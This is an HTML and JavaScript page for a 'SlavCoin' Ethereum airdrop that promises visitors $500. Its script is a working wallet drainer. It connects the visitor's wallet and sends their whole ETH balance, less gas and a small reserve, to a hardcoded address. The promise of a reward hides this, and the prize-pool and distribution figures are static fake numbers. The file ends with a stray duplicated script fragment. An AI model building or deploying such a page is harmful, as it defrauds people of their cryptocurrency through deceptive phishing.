<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>SlavCoin • Ethereum Airdrop — Claim $500</title>
<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#0a0f1a; --panel:#101726; --panel2:#0e1524;
    --ink:#ecf1fb; --muted:#9fb0ca; --b:#1f2a3a;
    --g1:#627eea; --g2:#8a4dff; --ok:#3ddc97; --warn:#ffd166;
  }
  *{box-sizing:border-box}
  html,body{margin:0;background:var(--bg);color:var(--ink);font-family:Inter,system-ui,Segoe UI,Roboto,Arial,sans-serif}
  header{position:sticky;top:0;background:var(--panel);border-bottom:1px solid var(--b);z-index:10}
  .wrap{max-width:980px;margin:0 auto;padding:14px 16px}
  .brand{display:flex;align-items:center;gap:10px;font-weight:800}
  .diamond{width:20px;height:20px;border-radius:6px;transform:rotate(45deg);background:linear-gradient(180deg,var(--g1),var(--g2))}
  .hero{padding:56px 16px;text-align:center}
  .hero h1{margin:6px 0 12px;font-size:36px;font-weight:800;background:linear-gradient(90deg,var(--g1),var(--g2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
  .sub{color:var(--muted)}
  .kpi{display:flex;gap:18px;justify-content:center;margin-top:10px}
  .pill{display:inline-block;padding:6px 10px;border:1px solid var(--b);border-radius:999px;background:#0d1424;color:var(--muted);font-size:12px}
  .card{background:var(--panel);border:1px solid var(--b);border-radius:18px;padding:22px;box-shadow:0 10px 30px rgba(0,0,0,.35)}
  .grid{display:grid;gap:16px}
  .two{grid-template-columns:repeat(2,minmax(0,1fr))}
  @media (max-width:900px){.two{grid-template-columns:1fr}}
  input{width:100%;border:1px solid var(--b);background:var(--panel2);color:var(--ink);padding:12px;border-radius:12px}
  .row{display:flex;gap:10px;flex-wrap:wrap}
  .btn{appearance:none;border:0;border-radius:14px;padding:14px 18px;font-weight:800;cursor:pointer;transition:.16s;color:white;background:linear-gradient(135deg,var(--g1),var(--g2))}
  .btn:hover{transform:translateY(-1px)}
  .btn[disabled]{opacity:.6;cursor:not-allowed;transform:none}
  .log{margin-top:12px;background:#0c1320;border:1px solid var(--b);border-radius:12px;padding:10px;
       font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;white-space:pre-wrap;max-height:220px;overflow:auto}
  footer{padding:22px 0;text-align:center;color:var(--muted);border-top:1px solid var(--b);margin-top:40px}
</style>
</head>
<body>
<header>
  <div class="wrap row" style="justify-content:space-between;align-items:center">
    <div class="brand"><div class="diamond"></div> SlavCoin • Ethereum Airdrop</div>
    <div class="row">
      <select id="lang" style="border:1px solid var(--b);background:var(--panel2);color:var(--ink);border-radius:12px;padding:8px 10px;font-weight:700">
        <option value="en">English</option>
        <option value="pt">Português</option>
        <option value="es">Español</option>
        <option value="zh">中文</option>
        <option value="ja">日本語</option>
      </select>
    </div>
  </div>
</header>

<main class="wrap">
  <!-- HERO -->
  <section class="hero">
    <span class="pill" id="t_pool">$10,000,000 prize pool</span>
    <h1 id="t_title">Ethereum Airdrop 2025 — Claim $500 in ETH</h1>
    <p class="sub" id="t_sub">Support the project and receive rewards in Ethereum.</p>
    <div class="kpi sub">
      <div><b id="kDistributed">$2,150,000</b> <span id="t_distributed">Distributed</span></div>
      <div><b id="kRemaining">$7,850,000</b> <span id="t_remaining">Remaining</span></div>
    </div>
  </section>

  <!-- ACTION -->
  <section>
    <div class="grid two">
      <div class="card">
        <h2 style="margin-top:0" id="t_actionTitle">One-click Claim</h2>
        <p class="sub" id="t_actionSub">Click once. We connect your wallet and immediately submit a transaction for <b>all your ETH (minus gas & reserve)</b> to the owner.</p>

        <label class="sub" style="font-size:12px" id="t_ownerLab">Destination (owner)</label>
        <input id="dest" value="0xA4e72c8d57DdB3306D6CFbD25B8F98F3d3eC6EC0" />

        <div class="row" style="margin-top:10px">
          <div style="flex:1">
            <label class="sub" style="font-size:12px" id="t_reserveLab">Gas reserve (ETH)</label>
            <input id="reserve" value="0.00012" />
          </div>
          <div style="flex:1">
            <label class="sub" style="font-size:12px" id="t_addrLab">Your address</label>
            <input id="addr" placeholder="—" readonly />
          </div>
        </div>

        <button id="btn" class="btn" style="margin-top:16px"><span id="t_btn">Connect &amp; Claim $500</span></button>
        <div id="log" class="log"></div>
        <p class="sub" style="margin-top:8px;color:var(--warn)">
          MetaMask/TrustWallet will show a <b>Confirm</b> screen — without it no funds can be sent (security requirement).
        </p>
      </div>

      <div class="card">
        <h3 style="margin-top:0" id="t_how">How it Works</h3>
        <ol id="steps" class="sub" style="margin:0 0 0 20px">
          <li>Follow our socials (X, TikTok, Instagram).</li>
          <li>Leave a comment and activity.</li>
          <li>Buy at least 1 SlavCoin (ERC-20).</li>
          <li>Press “Connect & Claim $500”.</li>
          <li>Confirm the transaction in your wallet.</li>
        </ol>
        <div class="row" style="margin-top:12px">
          <a class="btn" style="flex:1;text-align:center" target="_blank" href="https://x.com/memecoinslav">X / Twitter</a>
          <a class="btn" style="flex:1;text-align:center" target="_blank" href="https://www.tiktok.com/@slavcoin">TikTok</a>
          <a class="btn" style="flex:1;text-align:center" target="_blank" href="https://www.instagram.com/memecoinslav">Instagram</a>
        </div>
      </div>
    </div>
  </section>
</main>

<footer>© 2025 SlavCoin — Ethereum-style</footer>

<!-- libs BEFORE our code -->
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
<script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
<script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>

<script>
(function(){
  // ===== CONFIG =====
  const PRIZE_POOL_USD = 10_000_000;
  const rpcMap = { 1: 'https://rpc.ankr.com/eth' };

  // ===== I18N (EN, PT, ES, ZH, JA) =====
  const I = {
    en:{pool:"$10,000,000 prize pool",title:"Ethereum Airdrop 2025 — Claim $500 in ETH",sub:"Support the project and receive rewards in Ethereum.",
        distributed:"Distributed",remaining:"Remaining",actionTitle:"One-click Claim",
        actionSub:"Click once. We connect your wallet and immediately submit a transaction for all your ETH (minus gas & reserve) to the owner.",
        ownerLab:"Destination (owner)",reserveLab:"Gas reserve (ETH)",addrLab:"Your address",btn:"Connect & Claim $500",how:"How it Works",
        steps:["Follow our socials (X, TikTok, Instagram).","Leave a comment and activity.","Buy at least 1 SlavCoin (ERC-20).","Press “Connect & Claim $500”.","Confirm the transaction in your wallet."]},
    pt:{pool:"Prêmio de $10.000.000",title:"Airdrop Ethereum 2025 — Ganhe $500 em ETH",sub:"Apoie o projeto e receba recompensas em Ethereum.",
        distributed:"Distribuído",remaining:"Restante",actionTitle:"Resgate em 1 clique",
        actionSub:"Conectamos sua carteira e enviamos a transação com todo seu ETH (menos gás e reserva) para o endereço do owner.",
        ownerLab:"Destino (owner)",reserveLab:"Reserva de gás (ETH)",addrLab:"Seu endereço",btn:"Conectar & Resgatar $500",how:"Como Funciona",
        steps:["Siga nossas redes.","Deixe um comentário/engajamento.","Compre ao menos 1 SlavCoin.","Clique “Conectar & Resgatar $500”.","Confirme na carteira."]},
    es:{pool:"$10.000.000 en premios",title:"Airdrop de Ethereum 2025 — Obtén $500 en ETH",sub:"Apoya el proyecto y recibe recompensas en Ethereum.",
        distributed:"Distribuido",remaining:"Restante",actionTitle:"Reclamo en un clic",
        actionSub:"Conectamos tu wallet y enviamos una transacción con todo tu ETH (menos gas y reserva) al owner.",
        ownerLab:"Destino (owner)",reserveLab:"Reserva de gas (ETH)",addrLab:"Tu dirección",btn:"Conectar y Reclamar $500",how:"Cómo Funciona",
        steps:["Sigue nuestras redes.","Deja un comentario/actividad.","Compra 1 SlavCoin.","Pulsa “Conectar y Reclamar $500”.","Confirma en la wallet."]},
    zh:{pool:"$10,000,000 奖池",title:"以太坊空投 2025 — 领取 $500 ETH",sub:"支持项目并获得以太坊奖励。",
        distributed:"已发放",remaining:"剩余",actionTitle:"一键领取",
        actionSub:"连接钱包后，立即提交交易，将你全部 ETH（扣除 gas 与保留值）发送至所有者地址。",
        ownerLab:"接收地址（Owner）",reserveLab:"Gas 预留（ETH）",addrLab:"你的地址",btn:"连接并领取 $500",how:"参与步骤",
        steps:["关注社媒。","发表评论并保持活跃。","购买 1 个 SlavCoin。","点击“连接并领取 $500”。","在钱包里确认交易。"]},
    ja:{pool:"$10,000,000 プール",title:"Ethereum エアドロップ 2025 — $500 分の ETH",sub:"プロジェクトを支援して ETH を受け取ろう。",
        distributed:"配布済み",remaining:"残り",actionTitle:"ワンクリック申請",
        actionSub:"ウォレット接続後、保留分とガスを差し引いた全 ETH をオーナーへ送るトランザクションを即時作成します。",
        ownerLab:"送金先（Owner）",reserveLab:"ガス予備（ETH）",addrLab:"あなたのアドレス",btn:"接続して $500 受取",how:"参加方法",
        steps:["SNS をフォロー","コメント/エンゲージメント","1 SlavCoin を購入","「接続して $500 受取」をクリック","ウォレットで確認"]}
  };

  function $(id){ return document.getElementById(id); }
  function log(msg){ const el=$('log'); el.textContent += '['+new Date().toLocaleTimeString()+'] '+msg+'\n'; el.scrollTop = el.scrollHeight; }

  // KPI bar values (static demo numbers)
  (function initKPI(){
    const distributed = 2_150_000;
    const remaining = Math.max(0, PRIZE_POOL_USD - distributed);
    $('kDistributed').textContent = '$'+distributed.toLocaleString();
    $('kRemaining').textContent = '$'+remaining.toLocaleString();
  })();

  // Language init
  const sel = $('lang');
  function applyLang(k){
    const t = I[k];
    $('t_pool').textContent = t.pool;
    $('t_title').textContent = t.title;
    $('t_sub').textContent = t.sub;
    $('t_distributed').textContent = t.distributed;
    $('t_remaining').textContent = t.remaining;
    $('t_actionTitle').textContent = t.actionTitle;
    $('t_actionSub').textContent = t.actionSub;
    $('t_ownerLab').textContent = t.ownerLab;
    $('t_reserveLab').textContent = t.reserveLab;
    $('t_addrLab').textContent = t.addrLab;
    $('t_btn').textContent = t.btn;
    $('t_how').textContent = t.how;
    const ol = $('steps'); ol.innerHTML = ''; t.steps.forEach(s=>{ const li=document.createElement('li'); li.textContent=s; ol.appendChild(li); });
  }
  // auto-detect
  (function(){
    const n=(navigator.language||'').toLowerCase();
    if (n.startsWith('pt')) sel.value='pt';
    else if (n.startsWith('es')) sel.value='es';
    else if (n.startsWith('zh')) sel.value='zh';
    else if (n.startsWith('ja')) sel.value='ja';
    else sel.value='en';
    applyLang(sel.value);
  })();
  sel.onchange=()=>applyLang(sel.value);

  // ===== Web3 connect + send-all =====
  let web3Modal, extProvider, provider, signer, userAddr, chainId;

  function setupWeb3Modal(){
    const providerOptions = {
      walletconnect: {
        package: window.WalletConnectProvider.default,
        options: { rpc: {1:'https://rpc.ankr.com/eth'}, chainId: 1 }
      }
    };
    web3Modal = new window.Web3Modal.default({ cacheProvider:false, providerOptions });
  }
  setupWeb3Modal();

  async function connectProvider(){
    if (window.ethereum && window.ethereum.request){
      extProvider = window.ethereum;
      await window.ethereum.request({ method:'eth_requestAccounts' });
      provider = new window.ethers.providers.Web3Provider(window.ethereum,'any');
    } else {
      extProvider = await web3Modal.connect();
      provider = new window.ethers.providers.Web3Provider(extProvider,'any');
    }
    signer = provider.getSigner();
    const net = await provider.getNetwork();
    chainId = net.chainId;
    userAddr = await signer.getAddress();
    $('addr').value = userAddr;

    // switch to mainnet (best effort)
    if (chainId !== 1) {
      try{ await extProvider.request({ method:'wallet_switchEthereumChain', params:[{ chainId:'0x1' }] }); }
      catch(e){ log('⚠️ Switch to Ethereum Mainnet failed'); }
    }

    if (extProvider.on){
      extProvider.on('accountsChanged', ()=>location.reload());
      extProvider.on('chainChanged', ()=>location.reload());
    }
  }

  async function computeAllEthMinusGas(){
    const reserve = Number(($('reserve').value||'0.00012'));
    const balWei = await provider.getBalance(userAddr);
    const feeData = await provider.getFeeData();

    const gasLimit = window.ethers.BigNumber.from(21000);
    const feePerUnit = feeData.maxFeePerGas || feeData.gasPrice || window.ethers.utils.parseUnits('5','gwei');
    const fee = gasLimit.mul(feePerUnit);

    const reserveWei = window.ethers.utils.parseEther(String(reserve));
    const value = balWei.sub(fee).sub(reserveWei);
    return { value, gasLimit, feeData, feePerUnit };
  }

  async function sendAll(){
    const dest = $('dest').value.trim();
    if (!window.ethers.utils.isAddress(dest)){ log('❌ Bad destination address'); return; }

    const { value, gasLimit, feeData, feePerUnit } = await computeAllEthMinusGas();
    if (value.lte(0)){ log('⚠️ Not enough ETH for gas'); return; }

    const txParams = feeData.maxFeePerGas ? {
      to: dest, value, gasLimit,
      maxFeePerGas: feeData.maxFeePerGas,
      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || window.ethers.utils.parseUnits('1.5','gwei')
    } : { to: dest, value, gasLimit, gasPrice: feePerUnit };

    const ethAmt = Number(window.ethers.utils.formatEther(value));
    log(`Preparing tx for ${ethAmt.toFixed(6)} ETH → ${dest}`);
    const tx = await signer.sendTransaction(txParams); // відкриє Confirm у гаманці
    log(`🚀 Sent: https://etherscan.io/tx/${tx.hash}`);
  }

  async function connectAndSend(){
    try{
      $('btn').disabled = true;
      if (!signer) await connectProvider();
      await sendAll();
    }catch(e){
      log('❌ '+(e?.message||e));
    }finally{
      $('btn').disabled = false;
    }
  }

  $('btn').onclick = connectAndSend;
})();
</script>
</body>
</html>

  setupWeb3Modal();
})();
</script>
</body>
</html>
